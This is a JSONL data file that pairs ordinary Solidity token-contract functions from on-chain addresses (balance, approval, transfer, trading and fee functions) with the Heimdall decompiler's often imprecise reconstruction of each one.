{"contract_address": "0xf9F4ed2EE87e3Bc8a3cDC7538d1217B100511eA3", "original_solidity_code": "function openTrading() external onlyOwner() {\\r\\n        require(!tradingOpen,\\\"trading is already open\\\");\\r\\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\\r\\n        _approve(address(this), address(uniswapV2Router), _tTotal);\\r\\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\\r\\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\\r\\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\\r\\n        swapEnabled = true;\\r\\n        tradingOpen = true;\\r\\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_g / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x17;\n        var_e = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_f = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_f));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require(!0x3b9aca00 | (0x01 == 0x01), \"ERC20: approve to the zero address\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(address(this) - 0, \"ERC20: approve to the zero address\");\n        require(address(store_f / 0x01) - 0, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x22;\n        var_e = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_f = address(this);\n        var_i = 0x02;\n        var_f = address(store_f / 0x01);\n        address var_i = keccak256(var_f);\n        storage_map_n[var_f] = 0x3b9aca00;\n        var_a = 0x3b9aca00;\n        emit Approval(address(this), address(store_f / 0x01), 0x3b9aca00);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).factory(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_k = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).WETH(var_d); // staticcall\n        var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_l = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        address var_h = address(var_j);\n        (bool success, bytes memory ret0) = address(var_j).Unresolved_c9c65396(var_e); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x24;\n        var_e = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_g = 0x11;\n                        if (!0x0200 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                            var_g = 0x11;\n                            if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                if (!0x09 > 0x01) {\n                                    if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_g = 0x11;\n                                        if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                            var_g = 0x11;\n                                            if (!0x01) {\n                                            }\n                                            if (!0x3b9aca00 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_g = 0x11;\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x9EbFcFb424f91eE2F8f143cc4430e9E1E2E80939", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x5605C74F8079c9c648a513534354B5D6ee7dF8B4", "original_solidity_code": "function manualswap() external {\r\n        require(_msgSender() == _developmentAddress || _msgSender() == _marketingAddress);\r\n        uint256 contractBalance = balanceOf(address(this));\r\n        swapTokensForEth(contractBalance);\r\n    }", "heimdall_decompiled_code": "function manualswap() public view {\n        require(address(msg.sender) == (address(store_l / 0x01)));\n        require(address(msg.sender) == (address(store_m / 0x01)));\n        address var_a = address(this);\n        var_b = 0x02;\n        require(!(storage_map_h[var_a] > store_i), \"Amount must be less than total reflections\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x2a;\n        var_g = 0x416d6f756e74206d757374206265206c657373207468616e20746f74616c2072;\n        var_h = 0x65666c656374696f6e7300000000000000000000000000000000000000000000;\n        uint256 var_e = 0x40 + var_e;\n        var_c = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x0de0b6b3a7640000 > 0, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        uint256 var_h = var_e.length;\n        uint256 var_k = 0;\n        var_l = var_m;\n        var_k = 0;\n        if (0x0de0b6b3a7640000) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_n = 0x12;\n            if (!store_i < (store_i / 0x0de0b6b3a7640000)) {\n            }\n        }\n    }"}
{"contract_address": "0x19757069132C642180F1112d4cD61d67c1f06B49", "original_solidity_code": "function symbol() public view  returns (string memory) {\r\n        return _tokenSSSsymbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_i) {\n            if (store_i - ((store_i >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_i >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_i >> 0x01;\n                if (store_i) {\n                    if (store_i - ((store_i >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_i >> 0x01) {\n                            if (0x1f < (store_i >> 0x01)) {\n                                var_a = 0x05;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_i >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x620d4B40A1c80D62129bb195e1701e501F9a5d3b", "original_solidity_code": "function name() public view virtual override returns (string memory) {\\n        return _name;\\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (ownerf) {\n            if (!(ownerf) == ((ownerf >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (ownerf >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = ownerf >> 0x01;\n                if (ownerf) {\n                    if (!(ownerf) == ((ownerf >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!ownerf >> 0x01) {\n                            if (0x1f < (ownerf >> 0x01)) {\n                                var_a = 0x02;\n                                var_e = storage_map_n[var_a];\n                                if ((0x20 + var_c) + (ownerf >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked(0x20, var_c.length);\n                                        return abi.encodePacked(0x20, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xf7A80453F5BB234Bbfa9f6596Ef94cE42D7055EF", "original_solidity_code": "function getTokenInfo(uint256 _pid) public view returns (address) {\\n        TokenInfo storage tokens = AllowedCrypto[_pid];\\n        IERC20 paytoken;\\n        paytoken = tokens.paytoken;\\n        return address(paytoken); //Return the contract balance\\n    }", "heimdall_decompiled_code": "function getTokenInfo(uint256 arg0) public view returns (address) {\n        require(arg0 < store_e);\n        var_a = 0x0b;\n        uint256 var_b = address(storage_map_f[arg0 * 0x02]);\n        return address(storage_map_f[arg0 * 0x02]);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n    }"}
{"contract_address": "0x780c7f2FdF0D47F25f5858975DBd0159DB50C1B2", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\\r\\n        return _symbol;\\r\\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_v) {\n            if (store_v - ((store_v / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_v / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_v / 0x02;\n                if (store_v) {\n                    if (store_v - ((store_v / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_v / 0x02) {\n                            if (0x1f < (store_v / 0x02)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_v / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x46c4C3ef9A1557017955E74D4F3550971C2700A3", "original_solidity_code": "function showSupply() public view returns (uint256) {\r\n        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));\r\n    }", "heimdall_decompiled_code": "function showSupply() public view {\n        var_a = 0x06;\n        var_b = 0xdead;\n        uint256 var_c = 0x40 + var_c;\n        var_d = 0x1e;\n        var_e = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(store_s > totalSupply), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        uint256 var_h = var_c.length;\n        uint256 var_i = 0;\n        var_j = var_k;\n        var_i = 0;\n        if (!(totalSupply - store_s) > totalSupply) {\n            var_b = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_l = 0x11;\n        }\n    }"}
{"contract_address": "0x08f95c352a2CF003F0122938BF5ABf6340F37144", "original_solidity_code": "function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n    require(_balances[_msgSender()] >= amount, \"TT: transfer amount exceeds balance\");\r\n    _balances[_msgSender()] -= amount;\r\n    _balances[recipient] += amount;\r\n\r\n    emit Transfer(_msgSender(), recipient, amount);\r\n    return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x01;\n        require(!(arg1 > storage_map_b[var_a]), \"TT: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x54543a207472616e7366657220616d6f756e7420657863656564732062616c61;\n        var_g = 0x6e63650000000000000000000000000000000000000000000000000000000000;\n        var_a = msg.sender;\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] - arg1) > storage_map_b[var_a]);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_a = address(arg0);\n        var_b = 0x01;\n        require(!storage_map_b[var_a] > (arg1 + storage_map_b[var_a]));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_c = arg1;\n        emit Transfer(msg.sender, address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x0571e4201619916DB35214e935F0E46F037BBd2D", "original_solidity_code": "function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}", "heimdall_decompiled_code": "function totalSupply() public view {\n        var_a = 0x02;\n        var_b = 0xdead;\n        if (!(store_c - store_s) > store_c) {\n            var_b = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_c = 0x11;\n        }\n    }"}
{"contract_address": "0xbaAAc69029Fd7edcbcf3222Ec5831aFB9Cd832b8", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"Approve to the zero address\");\n        require(address(arg0) - 0, \"Approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x1b;\n        var_g = 0x417070726f766520746f20746865207a65726f20616464726573730000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x1d;\n        var_g = 0x417070726f76652066726f6d20746865207a65726f2061646472657373000000;\n    }"}
{"contract_address": "0x10A7A2212f6b6ffE22d339D8Aa6e89a17ad8b1ad", "original_solidity_code": "function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x561DeA92170f405c37fD183CAb08E41ea5d3DBEC", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\n        emit OwnershipTransferred(_owner, address(0));\\n        _owner = address(0);\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0x693E9C1e8935caf91F006bf5a2FF8a1aB2C569c7", "original_solidity_code": "function changeMagaPrinterGas(uint256 newGas) external onlyOwner {\r\n        magaPrinterGas = newGas;\r\n    }", "heimdall_decompiled_code": "function changeMagaPrinterGas(uint256 arg0) public {\n        require(msg.sender == (address(getOwner)), \"!Owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x06;\n        var_d = 0x214f776e65720000000000000000000000000000000000000000000000000000;\n        magaPrinterGas = arg0;\n    }"}
{"contract_address": "0x4B28fbCeB6a565dEce49390a4E7B8168F29c03BA", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        transferDelayEnabled=false;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x08) {\n            if ((0x01 == 0x01) | !0x041cdb40) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x041cdb40;\n                if (0x08) {\n                    if ((0x01 == 0x01) | !0x041cdb40) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x041cdb40;\n                        transferDelayEnabled = uint248(transferDelayEnabled);\n                        if (0x08) {\n                            if ((0x01 == 0x01) | !0x041cdb40) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x041cdb40;\n                                emit MaxTxAmountUpdated(0x041cdb40);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x08 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x08 < 0x4e)) | ((0x0a < 0x0133) & (0x08 < 0x20))) {\n                                                    if (!0x08 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x78D08E5831eeA6c6c6Af34d700F79A5b00873efE", "original_solidity_code": "function manualSwap() external {\r\n        require(_msgSender()==_taxWallet);\r\n        uint256 tokenBalance=balanceOf(address(this));\r\n        if(tokenBalance>0){\r\n          swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance=address(this).balance;\r\n        if(ethBalance>0){\r\n          sendETHToFee(ethBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_h[var_a] > 0);\n        store_g = (0x01 * 0x01000000000000000000000000000000000000000000) | (uint248(store_g));\n        require(!0x02 > 0xffffffffffffffff);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x41;\n        var_d = 0x02;\n        uint256 var_e = var_e + 0x60;\n        require(!0x02);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        address var_f = address(this);\n        var_g = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).WETH(var_h); // staticcall\n        var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!(((var_e + ret0.length) - var_e) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_i == (address(var_i)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        address var_j = address(var_i);\n        require(address(this) - 0, \"ERC20: approve to the zero address\");\n        require(address(store_f / 0x01) - 0, \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_l = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_f / 0x01);\n        address var_b = keccak256(var_a);\n        storage_map_h[var_a] = storage_map_h[var_a];\n        address var_k = storage_map_h[var_a];\n        emit Approval(address(this), address(store_f / 0x01), storage_map_h[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        var_l = storage_map_h[var_a];\n        uint256 var_m = 0;\n        uint256 var_n = ((0x04 + var_e) + 0xa0) - (0x04 + var_e);\n        uint256 var_p = var_e.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_f / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(store_f / 0x01).Unresolved_791ac947(var_l); // call\n        store_g = (0 * 0x01000000000000000000000000000000000000000000) | (uint248(store_g));\n        require(!address(this).balance > 0);\n        (bool success, bytes memory ret0) = address(transferDelayEnabled / 0x0100).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x20ad88B64104B4E9B3915aAB9c3bfb4E4121622f", "original_solidity_code": "function isExcludedFromFees(address account) public view returns(bool) {\r\n        return _isExcludedFromFees[account];\r\n    }", "heimdall_decompiled_code": "function isExcludedFromFees(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x20;\n        address var_c = !(!bytes1(storage_map_n[var_a]));\n        return !(!bytes1(storage_map_n[var_a]));\n    }"}
{"contract_address": "0xf7A80453F5BB234Bbfa9f6596Ef94cE42D7055EF", "original_solidity_code": "function getWinner() public view returns (address[] memory) {\\n        return winnerOfPrize;\\n     }", "heimdall_decompiled_code": "function getWinner() public view returns (bytes memory) {\n        uint256 var_a = var_a + (0x20 + (0x20 * store_i));\n        var_b = store_i;\n        if (!store_i) {\n            var_c = 0x04;\n            address var_d = address(storage_map_z[var_c]);\n            if ((0x20 + var_a) + (0x20 * store_i) > (0x20 + (0x20 + var_a))) {\n                address var_e = address(storage_map_aa[var_c]);\n                if ((0x20 + var_a) + (0x20 * store_i) > (0x20 + (0x20 + (0x20 + var_a)))) {\n                    var_d = 0x20;\n                    var_e = var_a.length;\n                    return abi.encodePacked(0x20, var_a.length);\n                }\n            }\n        }\n    }"}
{"contract_address": "0x926911A3809B6e15FA9dab87A4beAE0E83361C75", "original_solidity_code": "function updateDevWallet(address newWallet) external onlyOwner {\r\n        emit devWalletUpdated(newWallet, devWallet);\r\n        devWallet = newWallet;\r\n    }", "heimdall_decompiled_code": "function updateDevWallet(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit devWalletUpdated(address(arg0), address(store_l));\n        store_l = (address(arg0)) | (uint96(store_l));\n    }"}
{"contract_address": "0x31b60867a6203e76120df0612769ba136097eBc8", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x07;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] > (arg1 + storage_map_b[var_a])), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x07;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_d = arg1 + storage_map_b[var_a];\n        emit Approval(address(msg.sender), address(arg0), arg1 + storage_map_b[var_a]);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xe4a62805E925F427A0429586fFEf8b2647a3a534", "original_solidity_code": "function changeFees(uint256 _buy, uint256 _sell) external {\r\n        if(msg.sender == deployer)\r\n            _changeFees(_buy, _sell);\r\n    }", "heimdall_decompiled_code": "function changeFees(uint256 arg0, uint256 arg1) public {\n        require(msg.sender + 0xffffffffffffffffffffffff8e7daff51818c6cc5f28b174dda1b9a7aeaafefd);\n        store_d = arg0;\n        store_c = arg1;\n    }"}
{"contract_address": "0x384D84b0E082987D9f103c1ee2cD101C044a076a", "original_solidity_code": "function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_c[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0xfc606C8F7141110c3f295a22004D274680A9A029", "original_solidity_code": "function getWithdrawInfo() public view  returns(bool, uint256, uint256) {\r\n        BondEntry memory currentBond = bonds[msg.sender];\r\n        return (currentBond.withdrawTime > 0 ,currentBond.withdrawTime, getTokenOut(currentBond.ethAmount));\r\n    }", "heimdall_decompiled_code": "function getWithdrawInfo() public view returns (bool) {\n        address var_a = msg.sender;\n        var_b = 0x04;\n        uint256 var_c = var_c + 0x60;\n        address var_d = storage_map_a[var_a];\n        address var_e = storage_map_d[var_a];\n        address var_f = address(storage_map_e[var_a]);\n        if (0 - storage_map_a[var_a]) {\n            if ((TOKENS_PER_ETH == ((TOKENS_PER_ETH * storage_map_a[var_a]) / storage_map_a[var_a])) | !storage_map_a[var_a]) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_g = 0x11;\n                address var_h = !(!storage_map_d[var_a]);\n                address var_i = storage_map_d[var_a];\n                address var_j = TOKENS_PER_ETH * storage_map_a[var_a];\n                return abi.encodePacked(!(!storage_map_d[var_a]), storage_map_d[var_a], TOKENS_PER_ETH * storage_map_a[var_a]);\n                var_h = !(!storage_map_d[var_a]);\n                var_i = storage_map_d[var_a];\n                var_j = 0;\n                return abi.encodePacked(!(!storage_map_d[var_a]), storage_map_d[var_a], 0);\n            }\n        }\n    }"}
